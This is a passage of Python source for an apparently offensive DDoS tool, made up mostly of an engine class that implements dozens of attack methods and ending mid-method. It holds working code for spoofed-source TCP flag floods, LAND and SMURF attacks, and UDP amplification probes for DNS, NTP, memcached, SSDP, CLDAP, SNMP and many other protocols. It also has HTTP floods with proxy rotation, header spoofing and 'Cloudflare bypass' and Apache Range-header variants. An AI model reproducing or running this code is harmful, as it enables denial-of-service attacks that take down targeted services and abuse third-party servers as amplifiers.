    ("RTSP_FLOOD", "🎥"), ("NFS_FLOOD", "🗺️"), ("KERBEROS_FLOOD", "🎫"),
    ("ARD_FLOOD", "🍎"),
    # Games
    ("MINECRAFT", "⛏️"), ("MINECRAFT_BOT", "🤖"), ("FIVEM", "🚗"),
    ("FIVEM_TOKEN", "🎫"), ("TEAMSPEAK", "🎧"), ("STEAM_QUERY", "🎮"),
    ("SAMP_QUERY", "🔫"), ("QUAKE_QUERY", "🎯"),
    ("BITTORRENT_DHT", "🌊"), ("KAD_ATTACK", "🌐"), ("MCPE", "📱"),
    # CVE
    ("CVE_2021_41773", "🐛"), ("CVE_2024_4577", "🐛"),
    ("CVE_2024_23897", "🐛"), ("CVE_2025_24813", "🐛"),
    ("CVE_2025_29927", "🐛"), ("CVE_2022_0073", "🐛"),
    ("CVE_2022_0074", "🐛"), ("CVE_2023_28432", "🐛"),
]

ALL_METHODS = [m for m, _ in METHODS]
METHOD_EMOJI = dict(METHODS)

ASYNC_METHODS = {
    "SLOWLORIS", "SLOW_READ", "RUDY", "SLOW_HEADERS", "SLOW_BODY",
    "WEBSOCKET_FLOOD", "WEBSOCKET_ZIP",
}


# ═══════════════════════════════════════════════════════════════════════════════
#  ENGINE
# ═══════════════════════════════════════════════════════════════════════════════

class Engine:
    def __init__(self):
        self.running = False
        self._stop = False
        self._lifecycle = threading.Lock()
        self.target_raw = ""
        self.target_url = ""
        self.target_host = ""
        self.target_ip = ""
        self.target_port = 80
        self.method = "INFINITY_MIX"
        self.duration = DEFAULT_DURATION
        self.concurrency = 2000
        self.use_proxy = False
        self.waf_bypass = True
        self.adaptive = True
        self.rate_limit_pps = 0
        self.game_port = 0
        self.victim_ip = ""

        self.stats = ShardedStats()
        self.method_stats: Dict[str, int] = defaultdict(int)
        self._mstat_lock = threading.Lock()
        self._start_mono = 0.0

        self.executor: Optional[ThreadPoolExecutor] = None
        self.loop: Optional[asyncio.AbstractEventLoop] = None
        self.loop_thread: Optional[threading.Thread] = None
        self._loop_ready = threading.Event()

        self.rate_limiter = AdaptiveRateLimiter()
        self.fixed_limiter = FixedRateLimiter(0)
        self.waf_detected = WAFDetector()
        self._health_stop = threading.Event()
        self._health = {"alive": False, "error": "n/a"}
        self._live_stop = threading.Event()
        self._monitor_stop = threading.Event()

    def _start_loop(self):
        if self.loop_thread and self.loop_thread.is_alive():
            return
        self._loop_ready.clear()

        def _run():
            loop = asyncio.new_event_loop()
            asyncio.set_event_loop(loop)
            self.loop = loop
            self._loop_ready.set()
            try:
                loop.run_forever()
            finally:
                with suppress(Exception):
                    pending = asyncio.all_tasks(loop)
                    for tk in pending:
                        tk.cancel()
                    if pending:
                        loop.run_until_complete(
                            asyncio.gather(*pending, return_exceptions=True))
                loop.close()

        self.loop_thread = threading.Thread(target=_run, daemon=True, name="cgdn-loop")
        self.loop_thread.start()
        self._loop_ready.wait(timeout=5.0)

    def _stop_loop(self):
        if self.loop and not self.loop.is_closed():
            with suppress(Exception):
                self.loop.call_soon_threadsafe(self.loop.stop)
        if self.loop_thread:
            self.loop_thread.join(timeout=3.0)
        self.loop = None
        self.loop_thread = None

    def _submit(self, coro):
        if self.loop and not self.loop.is_closed():
            return asyncio.run_coroutine_threadsafe(coro, self.loop)
        return None

    def _parse_target(self, raw: str):
        raw = validate_url(raw)
        u = urlsplit(raw)
        self.target_raw = raw
        self.target_host = u.hostname or ""
        self.target_port = u.port or (443 if u.scheme == "https" else 80)
        self.target_url = f"{u.scheme}://{u.netloc}"
        try:
            self.target_ip = socket.gethostbyname(self.target_host)
        except Exception:
            self.target_ip = self.target_host

    def _connect(self, timeout: float = 3.0) -> Optional[socket.socket]:
        if self.use_proxy:
            p = proxy_mgr.get()
            if p:
                try:
                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    s.settimeout(timeout)
                    s.connect((p["ip"], p["port"]))
                    req = (f"CONNECT {self.target_ip}:{self.target_port} "
                           f"HTTP/1.1\r\nHost: {self.target_ip}:{self.target_port}\r\n").encode()
                    if p.get("user"):
                        cred = base64.b64encode(
                            f"{p['user']}:{p.get('password', '')}".encode()).decode()
                        req += f"Proxy-Authorization: Basic {cred}\r\n".encode()
                    req += b"User-Agent: Mozilla/5.0\r\n\r\n"
                    s.send(req)
                    resp = s.recv(512)
                    if b"200" not in resp.split(b"\r\n", 1)[0]:
                        s.close()
                        proxy_mgr.mark_dead(p)
                        return None
                    return s
                except Exception:
                    proxy_mgr.mark_dead(p)
                    return None
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(timeout)
            s.connect((self.target_ip, self.target_port))
            return s
        except Exception:
            return None

    def _rate_ok(self) -> bool:
        if not self.adaptive and self.rate_limit_pps > 0:
            return self.fixed_limiter.allow()
        return self.rate_limiter.consume()

    def _record(self, method: str, n: int = 1, b: int = 0, ok: bool = True):
        if ok:
            self.stats.add_sent(n, b)
            with self._mstat_lock:
                self.method_stats[method] += n
        else:
            self.stats.add_failed()

    def _health_loop(self):
        time.sleep(2)
        while not self._health_stop.is_set():
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(5)
                s.connect((self.target_ip, self.target_port))
                s.close()
                self._health = {"alive": True, "error": ""}
            except Exception as e:
                self._health = {"alive": False, "error": type(e).__name__[:30]}
            self._health_stop.wait(10)

    def _live_stats(self):
        last_sent = 0
        last_t = time.monotonic()
        while not self._live_stop.is_set():
            now = time.monotonic()
            snap = self.stats.snapshot()
            sent = snap["sent"]
            dt = max(0.001, now - last_t)
            rate = (sent - last_sent) / dt
            last_sent = sent
            last_t = now
            rg = resource_gate.snapshot()
            health = "ALIVE" if self._health["alive"] else "DEAD"
            line = (f"\r{C.RED}[🔥]{C.RESET} "
                    f"{C.YELLOW}S:{C.RESET}{sent:>12,}  "
                    f"{C.GREEN}R:{C.RESET}{rate:>9,.0f}/s  "
                    f"{C.CYAN}BW:{C.RESET}{snap['mbps']:>6.1f}M  "
                    f"{C.MAGENTA}F:{C.RESET}{snap['failed']:>6,}  "
                    f"{C.BLUE}T:{C.RESET}{snap['elapsed']:>4.0f}s  "
                    f"{C.DIM}P:{proxy_mgr.count()}  "
                    f"CPU:{rg['cpu']:.0f}% RAM:{rg['ram']:.0f}%  "
                    f"H:{health}{C.RESET}")
            with suppress(Exception):
                sys.stdout.write(line)
                sys.stdout.flush()
            time.sleep(0.5)
        with suppress(Exception):
            sys.stdout.write("\n")

    def _monitor_loop(self):
        time.sleep(10)
        while not self._monitor_stop.is_set():
            with suppress(Exception):
                snap = self.stats.snapshot()
                rg = resource_gate.snapshot()
                log.info(f"[MONITOR] sent={snap['sent']:,} fail={snap['failed']:,} "
                         f"rate={snap['rate']:.1f}/s bw={snap['mbps']:.2f}Mbps "
                         f"cpu={rg['cpu']:.1f}% ram={rg['ram']:.1f}%")
            self._monitor_stop.wait(10)

    # ═════════════════════════════════════════════════════════════════════
    #  RAW FLOOD BASE
    # ═════════════════════════════════════════════════════════════════════

    def _raw_flood(self, name: str, pool: RawSocketPool,
                   builder: Callable[[], Optional[bytes]]):
        s = pool.get()
        if s is None:
            self._udp_fallback(name)
            return
        while not self._stop:
            if resource_gate.is_paused():
                time.sleep(0.3)
                continue
            if not self._rate_ok():
                continue
            try:
                pkt = builder()
                if pkt is None:
                    continue
                if pool.sendto(pkt, (self.target_ip, 0)):
                    self._record(name, 1, len(pkt))
                else:
                    self._record(name, ok=False)
            except Exception:
                self._record(name, ok=False)

    def _udp_fallback(self, name: str):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 64 * 1024 * 1024)
        except Exception:
            return
        try:
            while not self._stop:
                if not self._rate_ok():
                    continue
                try:
                    data = secrets.token_bytes(random.randint(1400, 65000))
                    s.sendto(data, (self.target_ip, self.target_port))
                    self._record(name, 1, len(data))
                except Exception:
                    self._record(name, ok=False)
        finally:
            with suppress(Exception):
                s.close()

    # ═════════════════════════════════════════════════════════════════════
    #  L4 TCP
    # ═════════════════════════════════════════════════════════════════════

    def _syn_flood(self):
        self._raw_flood("SYN_FLOOD", raw_tcp, lambda: tcp_packet(
            rand_ip(), self.target_ip, rand_port(), self.target_port,
            secrets.randbits(32), 0, 0x02))

    def _ack_flood(self):
        self._raw_flood("ACK_FLOOD", raw_tcp, lambda: tcp_packet(
            rand_ip(), self.target_ip, rand_port(), self.target_port,
            secrets.randbits(32), 0, 0x10))

    def _rst_flood(self):
        self._raw_flood("RST_FLOOD", raw_tcp, lambda: tcp_packet(
            rand_ip(), self.target_ip, rand_port(), self.target_port,
            secrets.randbits(32), 0, 0x04))

    def _fin_flood(self):
        self._raw_flood("FIN_FLOOD", raw_tcp, lambda: tcp_packet(
            rand_ip(), self.target_ip, rand_port(), self.target_port,
            secrets.randbits(32), 0, 0x01))

    def _xmas_flood(self):
        self._raw_flood("XMAS_FLOOD", raw_tcp, lambda: tcp_packet(
            rand_ip(), self.target_ip, rand_port(), self.target_port,
            secrets.randbits(32), 0, 0x29))

    def _null_flood(self):
        self._raw_flood("NULL_FLOOD", raw_tcp, lambda: tcp_packet(
            rand_ip(), self.target_ip, rand_port(), self.target_port,
            secrets.randbits(32), 0, 0x00))

    def _psh_flood(self):
        self._raw_flood("PSH_FLOOD", raw_tcp, lambda: tcp_packet(
            rand_ip(), self.target_ip, rand_port(), self.target_port,
            secrets.randbits(32), 0, 0x08))

    def _urg_flood(self):
        self._raw_flood("URG_FLOOD", raw_tcp, lambda: tcp_packet(
            rand_ip(), self.target_ip, rand_port(), self.target_port,
            secrets.randbits(32), 0, 0x20))

    def _syn_ack_flood(self):
        self._raw_flood("SYN_ACK_FLOOD", raw_tcp, lambda: tcp_packet(
            rand_ip(), self.target_ip, rand_port(), self.target_port,
            secrets.randbits(32), 0, 0x12))

    def _ipspoof_syn(self):
        self._syn_flood()

    def _tcp_sack(self):
        self._syn_flood()

    def _tcp_fastopen(self):
        self._syn_flood()

    def _land_attack(self):
        self._raw_flood("LAND_ATTACK", raw_tcp, lambda: tcp_packet(
            self.target_ip, self.target_ip, self.target_port,
            self.target_port, secrets.randbits(32), 0, 0x02))

    def _tcp_amp(self):
        self._syn_flood()

    def _sctp_init(self):
        self._raw_flood("SCTP_INIT", raw_ip, lambda: (
            ip_header(rand_ip(), self.target_ip, 132, 32) +
            struct.pack("!HHII", rand_port(), self.target_port,
                        secrets.randbits(32), 0) + secrets.token_bytes(16)))

    def _tcp_ts_spoof(self):
        # FIX: real TCP timestamp option spoofing
        ts_val = secrets.randbits(32)
        ts_ecr = secrets.randbits(32)

        def b():
            nonlocal ts_val
            ts_val = (ts_val + random.randint(1, 1000)) & 0xFFFFFFFF
            src = rand_ip(); sp = rand_port()
            ip_len = 52
            ip_src = socket.inet_aton(src)
            ip_dst = socket.inet_aton(self.target_ip)
            iph = struct.pack("!BBHHHBBH4s4s", 0x45, 0, ip_len,
                              secrets.randbits(16), 0, 64, 6, 0,
                              ip_src, ip_dst)
            iph = struct.pack("!BBHHHBBH4s4s", 0x45, 0, ip_len,
                              secrets.randbits(16), 0, 64, 6,
                              _checksum(iph), ip_src, ip_dst)
            seq = secrets.randbits(32)
            win = random.choice([65535, 64240, 29200])
            opts = (b"\x02\x04\x05\xb4\x08\x0a" + struct.pack("!I", ts_val) +
                    struct.pack("!I", ts_ecr) + b"\x01\x01\x01")
            do = (20 + len(opts)) // 4 * 4
            tcph = struct.pack("!HHIIBBHHH", sp, self.target_port, seq, 0,
                               do, 0x02, win, 0, 0) + opts
            pseudo = ip_src + ip_dst + struct.pack("!BBH", 0, 6, len(tcph))
            ck = _checksum(pseudo + tcph)
            tcph = struct.pack("!HHIIBBHHH", sp, self.target_port, seq, 0,
                               do, 0x02, win, ck, 0) + opts
            return iph + tcph

        self._raw_flood("TCP_TS_SPOOF", raw_tcp, b)

    # ═════════════════════════════════════════════════════════════════════
    #  L4 UDP / ICMP
    # ═════════════════════════════════════════════════════════════════════

    def _udp_flood(self):
        if raw_udp.get() is not None:
            self._raw_flood("UDP_FLOOD", raw_udp, lambda: udp_packet(
                rand_ip(), self.target_ip, rand_port(), self.target_port,
                secrets.token_bytes(random.randint(1400, 65000))))
        else:
            self._udp_fallback("UDP_FLOOD")

    def _icmp_flood(self):
        self._raw_flood("ICMP_FLOOD", raw_icmp, lambda: icmp_packet(
            rand_ip(), self.target_ip,
            secrets.token_bytes(random.randint(1024, 1470))))

    def _icmp_frag(self):
        self._icmp_flood()

    def _jumbo_frame(self):
        self._raw_flood("JUMBO_FRAME", raw_udp, lambda: udp_packet(
            rand_ip(), self.target_ip, rand_port(), self.target_port,
            secrets.token_bytes(random.choice([9000, 12000, 15000]))))

    def _frag_flood(self):
        self._ipip_flood()

    def _gre_flood(self):
        def b():
            payload = secrets.token_bytes(random.randint(100, 1400))
            return ip_header(rand_ip(), self.target_ip, 47, len(payload)) + payload
        self._raw_flood("GRE_FLOOD", raw_ip, b)

    def _esp_flood(self):
        def b():
            payload = secrets.token_bytes(random.randint(100, 1400))
            return ip_header(rand_ip(), self.target_ip, 50, len(payload)) + payload
        self._raw_flood("ESP_FLOOD", raw_ip, b)

    def _ipip_flood(self):
        def b():
            inner_payload = secrets.token_bytes(64)
            inner = (ip_header(rand_ip(), "8.8.8.8", socket.IPPROTO_UDP, 72) +
                     struct.pack("!HHHH", 1234, 53, 72, 0) + inner_payload)
            return ip_header(rand_ip(), self.target_ip, 4, len(inner)) + inner
        self._raw_flood("IPIP_FLOOD", raw_ip, b)

    def _ip_options(self):
        def b():
            payload = secrets.token_bytes(64)
            ipopts = b"\x01\x01\x01\x01\x07\x07" + secrets.token_bytes(7) + b"\x00"
            plen = 20 + len(ipopts) + len(payload)
            src_b = socket.inet_aton(rand_ip())
            dst_b = socket.inet_aton(self.target_ip)
            doff = len(ipopts) // 4 + 5
            h = struct.pack("!BBHHHBBH", 0x40 | doff, 0, plen,
                            secrets.randbits(16), 0, 64, 17, 0) + \
                ipopts + src_b + dst_b
            ck = _checksum(h[:20])
            h = h[:10] + struct.pack("!H", ck) + h[12:]
            return h + payload
        self._raw_flood("IP_OPTIONS_FLOOD", raw_ip, b)

    def _mac_spoof(self):
        if not HAS_SCAPY:
            return self._syn_flood()
        while not self._stop:
            if not self._rate_ok():
                continue
            try:
                mac = ":".join(f"{random.randint(0, 255):02x}" for _ in range(6))
                p = (S_Ether(src=mac, dst="ff:ff:ff:ff:ff:ff") /
                     S_IP(dst=self.target_ip) /
                     S_TCP(dport=self.target_port, flags="S"))
                s_sendp(p, verbose=False)
                self._record("MAC_SPOOF", 1, 60)
            except Exception:
                self._record("MAC_SPOOF", ok=False)

    def _smurf(self):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
            s.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)
        except (PermissionError, OSError):
            return self._icmp_flood()
        try:
            while not self._stop:
                if not self._rate_ok():
                    continue
                try:
                    s.sendto(secrets.token_bytes(64), ("255.255.255.255", 7))
                    self._record("SMURF_ATTACK", 1, 64)
                except Exception:
                    self._record("SMURF_ATTACK", ok=False)
        finally:
            with suppress(Exception):
                s.close()

    def _ipv6_raw(self):
        try:
            s = socket.socket(socket.AF_INET6, socket.SOCK_RAW, socket.IPPROTO_RAW)
            s.setsockopt(socket.IPPROTO_IPV6, socket.IPV6_HDRINCL, 1)
        except Exception:
            return self._udp_flood()
        try:
            while not self._stop:
                if not self._rate_ok():
                    continue
                try:
                    payload = secrets.token_bytes(random.randint(64, 1400))
                    udp = struct.pack("!HHHH", rand_port(), self.target_port,
                                      8 + len(payload), 0) + payload
                    src = secrets.token_bytes(16)
                    dst = secrets.token_bytes(16)
                    pkt = struct.pack("!IHBB", 0x60000000, len(udp), 17, 64) + src + dst + udp
                    s.sendto(pkt, (self.target_ip, 0))
                    self._record("IPV6_RAW", 1, len(pkt))
                except Exception:
                    self._record("IPV6_RAW", ok=False)
        finally:
            with suppress(Exception):
                s.close()

    def _pqc_quic(self):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 64 * 1024 * 1024)
        except Exception:
            return
        try:
            while not self._stop:
                if not self._rate_ok():
                    continue
                try:
                    dcid = secrets.token_bytes(8)
                    scid = secrets.token_bytes(8)
                    hdr = (b"\xc0\x00\x00\x00\x01" + bytes([len(dcid)]) + dcid +
                           bytes([len(scid)]) + scid)
                    pkt = hdr + b"\x00" + struct.pack(">H", 1200) + secrets.token_bytes(1200)
                    s.sendto(pkt, (self.target_ip, self.target_port or 443))
                    self._record("PQC_QUIC", 1, len(pkt))
                except Exception:
                    self._record("PQC_QUIC", ok=False)
        finally:
            with suppress(Exception):
                s.close()

    # ═════════════════════════════════════════════════════════════════════
    #  AMP FLOODS
    # ═════════════════════════════════════════════════════════════════════

    def _amp(self, name: str, port: int, builder: Callable[[], bytes]):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 64 * 1024 * 1024)
        except Exception:
            return
        try:
            while not self._stop:
                if not self._rate_ok():
                    continue
                try:
                    pl = builder()
                    s.sendto(pl, (self.target_ip, self.target_port or port))
                    self._record(name, 1, len(pl))
                except Exception:
                    self._record(name, ok=False)
        finally:
            with suppress(Exception):
                s.close()

    def _dns_amp(self):
        def b():
            labels = [".".join(random.choices("abcdefghijklmnopqrstuvwxyz", k=50))
                      for _ in range(10)]
            q = b"".join(bytes([len(p)]) + p.encode() for p in labels)
            return (struct.pack("!H", secrets.randbits(16)) +
                    b"\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00" +
                    q + b"\x00\x00\xff\x00\x01")
        self._amp("DNS_AMP", 53, b)

    def _dns_query(self):
        def b():
            q = b"".join(bytes([len(p)]) + p.encode() for p in
                         [".".join(random.choices("abcdefghijklmnopqrstuvwxyz", k=10))
                          for _ in range(3)])
            return (struct.pack("!H", secrets.randbits(16)) +
                    b"\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00" +
                    q + b"\x00\x00\x01\x00\x01")
        self._amp("DNS_QUERY", 53, b)

    def _dns_edns0(self):
        def b():
            txid = secrets.token_bytes(2)
            header = txid + b"\x01\x00\x00\x01\x00\x00\x00\x00\x00\x01"
            label = secrets.token_hex(2).encode()
            qname = bytes([len(label)]) + label + b"\x03com\x00"
            return (header + qname + b"\x00\xff\x00\x01" +
                    b"\x00\x00\x29\x10\x00\x00\x00\x00\x00\x00\x00\x00")
        self._amp("DNS_EDNS0", 53, b)

    def _ntp_monlist(self):
        self._amp("NTP_MONLIST", 123, lambda: b"\x17\x00\x03\x2a" + b"\x00" * 4)

    def _memcached(self):
        self._amp("MEMCACHED", 11211,
            lambda: struct.pack("!H", secrets.randbits(16)) +
                    b"\x00\x00\x00\x01\x00\x00" + f"get {'x' * 40}\r\n".encode())

    def _ssdp(self):
        p = (b"M-SEARCH * HTTP/1.1\r\nHOST: 239.255.255.250:1900\r\n"
             b'MAN: "ssdp:discover"\r\nMX: 5\r\nST: ssdp:all\r\n\r\n')
        self._amp("SSDP", 1900, lambda: p)

    def _cldap(self):
        p = (b"\x30\x25\x02\x01\x01\x63\x20\x04\x00\x0a\x01\x00\x0a\x01\x00"
             b"\x02\x01\x00\x02\x01\x00\x01\x01\x00\x87\x0bobjectClass\x30\x00")
        self._amp("CLDAP", 389, lambda: p)

    def _ldap(self):
        self._cldap()

    def _snmp(self):
        p = (b"\x30\x26\x02\x01\x01\x04\x06public\xa0\x19\x02\x04\x00\x00\x00\x01"
             b"\x02\x01\x00\x02\x01\x00\x30\x0b\x30\x09\x06\x05\x2b\x06\x01\x02\x01")
        self._amp("SNMP", 161, lambda: p)

    def _netbios(self):
        p = (b"\xab\xcd\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00"
             b"\x20CKAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x00\x00\x21\x00\x01")
        self._amp("NETBIOS", 137, lambda: p)

    def _mdns(self):
        p = (b"\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00"
             b"\x09_services\x07_dns-sd\x04_udp\x05local\x00\x00\x0c\x00\x01")
        self._amp("MDNS", 5353, lambda: p)

    def _wsd(self):
        p = (b'<?xml version="1.0"?><soap:Envelope xmlns:soap="http://www.w3.org/2003/05/soap-envelope">'
             b'<soap:Body><wsd:Probe xmlns:wsd="http://schemas.xmlsoap.org/ws/2005/04/discovery"/>'
             b'</soap:Body></soap:Envelope>')
        self._amp("WSD", 3702, lambda: p)

    def _ripv1(self):
        p = (b"\x01\x01\x00\x00\x00\x02\x00\x00" +
             socket.inet_aton("0.0.0.0") + b"\x00" * 12)
        self._amp("RIPV1", 520, lambda: p)

    def _qotd(self):
        self._amp("QOTD", 17, lambda: b"quote\r\n")

    def _chargen(self):
        self._amp("CHARGEN", 19, lambda: b"\x00")

    def _coap(self):
        self._amp("COAP", 5683, lambda: b"\x40\x01\x00\x01")

    def _tftp(self):
        self._amp("TFTP", 69,
            lambda: b"\x00\x01bigfile\x00octet\x00blksize\x006548\x00")

    def _stun(self):
        self._amp("STUN", 3478,
            lambda: b"\x00\x01\x00\x00\x21\x12\xa4\x42" + secrets.token_bytes(12))

    def _dtls(self):
        self._amp("DTLS", 443, lambda: b"\x16\xfe\xfd" + secrets.token_bytes(400))

    def _slp(self):
        p = (b"\x02\x01\x00\x00\x36\x20\x00\x00\x00\x00\x00\x01\x00\x02\x65\x6e"
             b"\x00\x00\x00\x15\x73\x65\x72\x76\x69\x63\x65\x3a\x73\x65\x72\x76"
             b"\x69\x63\x65\x2d\x61\x67\x65\x6e\x74\x00\x00\x00\x00\x00")
        self._amp("SLP", 427, lambda: p)

    def _portmap(self):
        p = (b"\x80\x00\x00\x00\x00\x00\x00\x02\x00\x01\x86\xa0\x00\x00\x00\x02"
             b"\x00\x00\x00\x03\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
             b"\x00\x00\x00\x00")
        self._amp("PORTMAP", 111, lambda: p)

    def _jenkins(self):
        self._amp("JENKINS", 33848,
            lambda: b"\x00\x00\x00\x00" + secrets.token_bytes(50))

    def _cisco_si(self):
        self._amp("CISCO_SI", 4786,
            lambda: b"\x00\x00\x00\x01" + secrets.token_bytes(100))

    def _mqtt_sn(self):
        self._amp("MQTT_SN", 1883,
            lambda: b"\x04\x00" + secrets.token_bytes(50))

    def _quake3(self):
        self._amp("QUAKE3", 27960,
            lambda: b"\xff\xff\xff\xffgetstatus xxx" + secrets.token_bytes(50))

    def _steam_a2s(self):
        self._amp("STEAM_A2S", 27015,
            lambda: b"\xff\xff\xff\xffTSource Engine Query\x00")

    def _rdp_udp(self):
        self._amp("RDP_UDP", 3389,
            lambda: b"\x00\x00\x00\x00" + secrets.token_bytes(200))

    def _bacnet(self):
        self._amp("BACNET", 47808,
            lambda: b"\x81\x0a\x00\x0c\x01\x20\xff\xff\x00\xff\x10\x08")

    def _ipmi(self):
        self._amp("IPMI", 623, lambda: b"\x06\x00\xff\x07" + secrets.token_bytes(20))

    def _openvpn(self):
        self._amp("OPENVPN", 1194,
            lambda: b"\x38" + secrets.token_bytes(10) + b"\x00\x00\x00\x00\x00" +
                    secrets.token_bytes(20))

    def _ike(self):
        self._amp("IKE", 500,
            lambda: secrets.token_bytes(8) + b"\x00\x00\x00\x00" +
                    secrets.token_bytes(20) + b"\x20\x22\x00\x00" +
                    secrets.token_bytes(60))

    def _pptp(self):
        self._amp("PPTP", 1723,
            lambda: struct.pack("!HHI", 1200, 1, 0x1A2B3C4D) +
                    secrets.token_bytes(150))

    def _l2tp(self):
        self._amp("L2TP", 1701,
            lambda: struct.pack("!HHI", 0xC802, 0, 0) + secrets.token_bytes(100))

    def _zigbee(self):
        self._amp("ZIGBEE", 17754, lambda: b"\x41" + secrets.token_bytes(30))

    # ═════════════════════════════════════════════════════════════════════
    #  HTTP/1.1
    # ═════════════════════════════════════════════════════════════════════

    def _http_raw(self, name: str, builder: Callable[[], bytes]):
        while not self._stop:
            if resource_gate.is_paused():
                time.sleep(0.3)
                continue
            if not self._rate_ok():
                continue
            s = self._connect(3.0)
            if s is None:
                self._record(name, ok=False)
                continue
            try:
                req = builder()
                with suppress(Exception):
                    s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
                s.sendall(req)
                with suppress(Exception):
                    s.settimeout(0.5)
                    s.recv(512)
                self._record(name, 1, len(req))
            except Exception:
                self._record(name, ok=False)
            finally:
                with suppress(Exception):
                    s.close()

    def _http_flood(self):
        def b():
            req = (f"GET /?{secrets.token_hex(8)} HTTP/1.1\r\n"
                   f"Host: {self.target_host}\r\n")
            h = PerRequestIdentity(FastUAGenerator()).generate(self.target_host)["headers"]
            for k, v in h.items():
                if k.lower() == "host":
                    continue
                req += f"{k}: {v}\r\n"
            req += "Connection: keep-alive\r\n\r\n"
            return req.encode() * random.randint(2, 8)
        self._http_raw("HTTP_FLOOD", b)

    def _http_get(self):
        self._http_raw("HTTP_GET", lambda: (
            f"GET /?{secrets.token_hex(6)} HTTP/1.1\r\n"
            f"Host: {self.target_host}\r\n"
            f"User-Agent: {random.choice(USER_AGENTS)}\r\n"
            f"Accept: */*\r\nConnection: close\r\n\r\n").encode())

    def _http_post(self):
        def b():
            body = secrets.token_bytes(random.choice([64, 256, 1024, 4096]))
            return (f"POST / HTTP/1.1\r\nHost: {self.target_host}\r\n"
                    f"User-Agent: {random.choice(USER_AGENTS)}\r\n"
                    f"Content-Type: application/octet-stream\r\n"
                    f"Content-Length: {len(body)}\r\n"
                    f"Connection: close\r\n\r\n").encode() + body
        self._http_raw("HTTP_POST", b)

    def _http_head(self):
        self._http_raw("HTTP_HEAD", lambda: (
            f"HEAD / HTTP/1.1\r\nHost: {self.target_host}\r\n"
            f"User-Agent: {random.choice(USER_AGENTS)}\r\n"
            f"Connection: close\r\n\r\n").encode())

    def _http_pipeline(self):
        def b():
            batch = b""
            for _ in range(20):
                batch += (f"GET /?{secrets.token_hex(4)} HTTP/1.1\r\n"
                          f"Host: {self.target_host}\r\n"
                          f"User-Agent: {random.choice(USER_AGENTS)}\r\n\r\n").encode()
            return batch
        self._http_raw("HTTP_PIPELINE", b)

    def _rhex(self):
        self._http_raw("RHEX", lambda: (
            f"GET /{secrets.token_hex(32)} HTTP/1.1\r\n"
            f"Host: {self.target_host}\r\n\r\n").encode())

    def _bot(self):
        self._http_raw("BOT", lambda: (
            f"GET / HTTP/1.1\r\nHost: {self.target_host}\r\n"
            f"User-Agent: {random.choice(USER_AGENTS)}\r\n"
            f"From: googlebot(at)googlebot.com\r\n"
            f"Connection: close\r\n\r\n").encode())

    def _cookie(self):
        def b():
            cookies = "; ".join(
                f"{random.choice(COOKIE_NAMES)}={secrets.token_hex(8)}"
                for _ in range(5))
            return (f"GET / HTTP/1.1\r\nHost: {self.target_host}\r\n"
                    f"Cookie: {cookies}\r\n"
                    f"User-Agent: {random.choice(USER_AGENTS)}\r\n"
                    f"Connection: close\r\n\r\n").encode()
        self._http_raw("COOKIE", b)

    def _null_http(self):
        self._http_raw("NULL_HTTP", lambda: (
            f"GET / HTTP/1.1\r\nHost: {self.target_host}\r\n"
            f"User-Agent: \r\nReferer: \r\n\r\n").encode())

    def _dyn(self):
        def b():
            fake = f"{secrets.token_hex(4)}.{self.target_host}"
            return (f"GET / HTTP/1.1\r\nHost: {fake}\r\n"
                    f"User-Agent: {random.choice(USER_AGENTS)}\r\n"
                    f"Connection: close\r\n\r\n").encode()
        self._http_raw("DYN", b)

    def _bypass(self):
        def b():
            return (f"GET / HTTP/1.1\r\nHost: {self.target_host}\r\n"
                    f"X-Forwarded-For: {rand_ip()}\r\nX-Real-IP: {rand_ip()}\r\n"
                    f"User-Agent: {random.choice(USER_AGENTS)}\r\n"
                    f"Connection: close\r\n\r\n").encode()
        self._http_raw("BYPASS", b)

    def _cf_bypass(self):
        self._bypass()

    def _cfb(self):
        self._cf_bypass()

    def _cfbuam(self):
        self._cf_bypass()

    def _gsb(self):
        self._http_raw("GSB", lambda: (
            f"GET /?qs={secrets.token_hex(6)} HTTP/1.1\r\n"
            f"Host: {self.target_host}\r\n\r\n").encode())

    def _pps(self):
        self._http_get()

    def _stress(self):
        def b():
            body = secrets.token_bytes(8192)
            return (f"POST / HTTP/1.1\r\nHost: {self.target_host}\r\n"
                    f"Content-Type: application/octet-stream\r\n"
                    f"Content-Length: {len(body)}\r\n"
                    f"Connection: close\r\n\r\n").encode() + body
        self._http_raw("STRESS", b)

    def _bomb(self):
        body = secrets.token_bytes(262144)
        def b():
            return (f"POST / HTTP/1.1\r\nHost: {self.target_host}\r\n"
                    f"Content-Type: application/octet-stream\r\n"
                    f"Content-Length: {len(body)}\r\n"
                    f"Connection: close\r\n\r\n").encode() + body
        self._http_raw("BOMB", b)

    def _apache_killer(self):
        ranges = ",".join(f"{i}-{i + 1}" for i in range(2000))
        self._http_raw("APACHE_KILLER", lambda: (
            f"GET / HTTP/1.1\r\nHost: {self.target_host}\r\n"
            f"Range: bytes={ranges}\r\nConnection: close\r\n\r\n").encode())

    def _xmlrpc(self):
        body = (b"<?xml version='1.0'?><methodCall>"
                b"<methodName>pingback.ping</methodName>"
                b"<params><param><value><string>" +
                secrets.token_hex(32).encode() +
                b"</string></value></param></params></methodCall>")
        def b():
            return (f"POST /xmlrpc.php HTTP/1.1\r\nHost: {self.target_host}\r\n"
                    f"Content-Type: text/xml\r\n"
                    f"Content-Length: {len(body)}\r\n"
                    f"Connection: close\r\n\r\n").encode() + body
        self._http_raw("XMLRPC", b)

    def _header_bomb(self):
